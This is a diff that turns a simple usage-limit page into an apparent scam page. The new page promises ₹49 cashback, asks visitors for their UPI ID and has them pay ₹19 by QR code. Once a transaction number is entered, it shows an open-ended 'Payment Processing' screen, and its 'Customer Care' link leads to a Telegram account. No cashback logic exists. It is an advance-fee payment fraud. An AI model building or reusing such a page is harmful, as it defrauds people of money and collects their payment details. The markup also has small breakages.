@@ -1,124 +1,186 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Time Limit</title>
-
-<style>
-  * {
-    box-sizing: border-box;
-  }
-
-  body {
-    margin: 0;
-    height: 100vh;
-    background: linear-gradient(180deg, #f1f1f1, #ffffff);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial;
-  }
-
-  .card {
-    width: 90%;
-    max-width: 360px;
-    text-align: center;
-    padding: 30px 20px;
-  }
-
-  .icon {
-    font-size: 64px;
-    margin-bottom: 18px;
-  }
-
-  h1 {
-    margin: 0;
-    font-size: 24px;
-    font-weight: 700;
-  }
-
-  .subtext {
-    margin-top: 10px;
-    font-size: 14px;
-    color: #555;
-  }
-
-  .open-time {
-    margin-top: 14px;
-    font-size: 16px;
-    font-weight: 600;
-    color: #000;
-  }
-
-  button {
-    width: 100%;
-    margin-top: 28px;
-    padding: 14px;
-    font-size: 16px;
-    font-weight: 600;
-    border: none;
-    border-radius: 10px;
-    background: #000;
-    color: #fff;
-    cursor: pointer;
-  }
-
-  button:disabled {
-    background: #999;
-    cursor: not-allowed;
-  }
-
-  .timer {
-    margin-top: 14px;
-    font-size: 14px;
-    color: #666;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BrokIng UI</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body {
+      margin: 0;
+      background: linear-gradient(#eef6f9, #ffffff);
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+    }
+    .app {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 22px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    }
+    .logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #39d0b5, #2b7cff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .logo-circle img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      border-radius:50%;
+    }
+    }
+    h1 {
+      font-size: 20px;
+      margin: 10px 0 0;
+      text-align: center;
+      font-weight: 600;
+    }
+    .sub {
+      text-align: center;
+      color: #6b7280;
+      font-size: 13px;
+    }
+    .payout {
+      margin: 25px 0;
+      background: #f9fafb;
+      border-radius: 14px;
+      padding: 18px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      box-shadow: inset 0 0 0 1px #eef2f5;
+    }
+    .rupee {
+      width: 46px;
+      height: 46px;
+      border-radius: 12px;
+      background: #fff3d9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: #f59e0b;
+      font-weight: 600;
+    }
+    .payout-text small {
+      color: #6b7280;
+      font-size: 12px;
+    }
+    .payout-text b {
+      font-size: 22px;
+      display: block;
+      margin-top: 4px;
+    }
+    label {
+      font-size: 13px;
+      color: #374151;
+      margin-bottom: 6px;
+      display: block;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      border: 1px solid #e5e7eb;
+      font-size: 14px;
+      outline: none;
+    }
+    input:focus { border-color: #3b82f6; }
+    button {
+      width: 100%;
+      margin-top: 22px;
+      padding: 15px;
+      border: none;
+      border-radius: 12px;
+      background: #2b7cff;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button:active { transform: scale(0.98); }
+  </style>
 </head>
-
 <body>
-
-<div class="card">
-  <div class="icon">⏳</div>
-
-  <h1>Time Limit</h1>
-
-  <div class="subtext">
-    You’ve reached your usage limit.<br>
-    Please try again later.
-  </div>
-
-  <div class="open-time">
-    App Open Time: <strong>4:00 PM</strong>
-  </div>
-
-  <button id="refreshBtn" onclick="startRefresh()">Refresh</button>
-
-  <div class="timer" id="timerText"></div>
+  <div class="app">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+      <div style="font-size:13px;color:#2563eb;font-weight:500;cursor:pointer;" onclick="openSupport()">Customer Care</div>
+    </div>
+    <div class="logo">
+      <div class="logo-circle"><img src="https://i.ibb.co/7JxbMKGG/images-26.jpg"Logo"></div>
+      <h1>Cashback 21 Dec To 1 Jan</h1>
+      <div class="sub">Get Cashback Within 1 Hours<br>#HighestCashback</div>
+    </div><div class="payout">
+  <div class="rupee">₹</div>
+  <div class="payout-text">
+    <small>Cashback  </small>
+    <b>₹49</b>
+</div>
 </div>
 
+<label>UPI ADDRESS</label>
+<input id="upiInput" type="text" placeholder="Enter UPI ID" />
+<div id="upiError" style="display:none;color:#ef4444;font-size:13px;margin-top:6px;">Please fill UPI ID</div>
+
+<button onclick="payNow()">Payment ₹19</button>
+
+  </div>
 <script>
-  function startRefresh() {
-    const btn = document.getElementById("refreshBtn");
-    const timerText = document.getElementById("timerText");
-
-    btn.disabled = true;
-
-    let timeLeft = 3;
-    timerText.innerText = "Refreshing in " + timeLeft + " seconds...";
-
-    const countdown = setInterval(() => {
-      timeLeft--;
-      timerText.innerText = "Refreshing in " + timeLeft + " seconds...";
-
-      if (timeLeft === 0) {
-        clearInterval(countdown);
-        location.reload();
-      }
-    }, 1000);
+function payNow(){
+  const upi = document.getElementById('upiInput').value.trim();
+  if(!upi){
+    document.getElementById('upiError').style.display='block';
+    document.getElementById('upiInput').focus();
+    return;
   }
+  document.getElementById('upiError').style.display='none';
+  document.getElementById('qrModal').style.display='flex';
+}
 </script>
-
-</body>
+<div id="qrModal" style="display:none;position:fixed;inset:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column;padding:20px;">
+  <img src="https://i.ibb.co/d0sX6zjV/IMG-20251224-214557.jpg" style="max-width:90%;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.2);">
+  <h2 style="margin-top:20px;font-weight:600;">Screenshot & Pay ₹19</h2>
+  <p style="color:#6b7280;text-align:center;">Scan this QR code using any UPI app and complete the payment</p>
+  <div style="width:100%;max-width:320px;margin-top:20px;">
+    <input id="utrInput" type="text" placeholder="Enter UTR Number" style="width:100%;padding:14px;border-radius:10px;border:1px solid #e5e7eb;font-size:14px;" />
+    <button onclick="submitUTR()" style="width:100%;margin-top:12px;padding:14px;border:none;border-radius:12px;background:#16a34a;color:#fff;font-size:16px;font-weight:600;">Submit</button>
+  </div>
+</div>
+<script>
+function openSupport(){
+  window.open('https://t.me/nithunat','_blank');
+}
+</script>
+<div id="processing" style="display:none;position:fixed;inset:0;background:#fff;z-index:1000;align-items:center;justify-content:center;flex-direction:column;">
+  <div style="width:120px;height:120px;border-radius:50%;overflow:hidden;box-shadow:0 10px 25px rgba(0,0,0,0.15);">
+    <img src="https://i.ibb.co/hRxqY3gG/icono-ind-prestamos.png" style="width:100%;height:100%;object-fit:cover;">
+  </div>
+  <h2 style="margin-top:20px;font-weight:600;"
+  <h2 style="margin-top:20px;font-weight:600;">Payment Processing</h2>
+  <p style="color:#6b7280;text-align:center;">Please wait up to 24 hour</p>
+</div><style>
+@keyframes spin{to{transform:rotate(360deg)}}
+</style><script>
+function submitUTR(){
+  const utr = document.getElementById('utrInput').value.trim();
+  if(!utr){ alert('Please enter UTR number'); return; }
+  document.getElementById('qrModal').style.display='none';
+  document.getElementById('processing').style.display='flex';
+}
+</script></body>
 </html>
